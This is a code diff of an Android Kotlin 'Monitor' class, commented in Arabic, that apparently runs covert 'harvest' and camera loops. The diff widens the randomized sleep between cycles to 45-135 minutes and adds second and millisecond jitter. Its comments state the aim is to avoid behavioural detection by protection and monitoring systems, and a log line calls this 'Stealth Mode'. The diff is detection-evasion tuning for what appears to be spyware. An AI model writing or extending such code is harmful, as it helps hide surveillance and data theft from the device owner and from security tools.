@@ -33,7 +33,7 @@ import kotlin.random.Random
  * ✅ تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
  * ✅ تم توسيع نطاق تأخير بدء التشغيل إلى 15-60 ثانية.
  * ✅ تم زيادة الحد الأدنى للفاصل الزمني إلى 120 ثانية.
- * ✅ تم توسيع النطاق الزمني بين دورات المراقبة إلى 30-90 دقيقة لتجنب الكشف السلوكي.
+ * ✅ تم توسيع النطاق الزمني بين دورات المراقبة إلى 45-135 دقيقة مع تشويش بالثواني والميلي ثانية لتجنب الكشف السلوكي.
  */
 class Monitor private constructor(context: Context) {
 
@@ -445,7 +445,7 @@ class Monitor private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة جداً
+    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة جداً (45-135 دقيقة)
     // ============================================================
 
     fun start() {
@@ -492,7 +492,9 @@ class Monitor private constructor(context: Context) {
                 forceHarvest()
             }
 
-            // ✅ الحلقة الرئيسية مع Jitter محسن وفترات متباعدة جداً (30-90 دقيقة)
+            // ✅ الحلقة الرئيسية مع Jitter محسن وفترات متباعدة جداً (45-135 دقيقة)
+            // هذا النطاق الواسع مع التشويش بالثواني والميلي ثانية يجعل من المستحيل
+            // على أنظمة المراقبة تحديد نمط زمني ثابت
             while (isRunning && isActive) {
                 try {
                     // تنفيذ منطق الحصاد والكاميرا
@@ -502,13 +504,13 @@ class Monitor private constructor(context: Context) {
                     writeLog("Monitor loop error: ${e.message}")
                 }
 
-                // ✅ جيتر بشري متقدم: فترات متباعدة عشوائية تماماً (بين 30 و 90 دقيقة)
-                // لتجنب أي نمط زمني يمكن أن ترصده أنظمة الحماية
-                val baseMinutes = Random.nextInt(30, 91)
+                // ✅ نطاق أوسع (45-135 دقيقة) مع تشويش بالثواني والميلي ثانية
+                val baseMinutes = Random.nextInt(45, 136)
                 val jitterSeconds = Random.nextInt(0, 60)
-                val finalDelay = (baseMinutes * 60L + jitterSeconds) * 1000L
+                val jitterMs = Random.nextLong(0, 999)
+                val finalDelay = (baseMinutes * 60_000L) + (jitterSeconds * 1000L) + jitterMs
                 
-                writeLog("⏱️ Next cycle in ${(finalDelay / 60000)}m ${(finalDelay % 60000) / 1000}s")
+                writeLog("⏱️ Next cycle in ${baseMinutes}m ${jitterSeconds}s ${jitterMs}ms (Stealth Mode)")
                 delay(finalDelay)
             }
         }
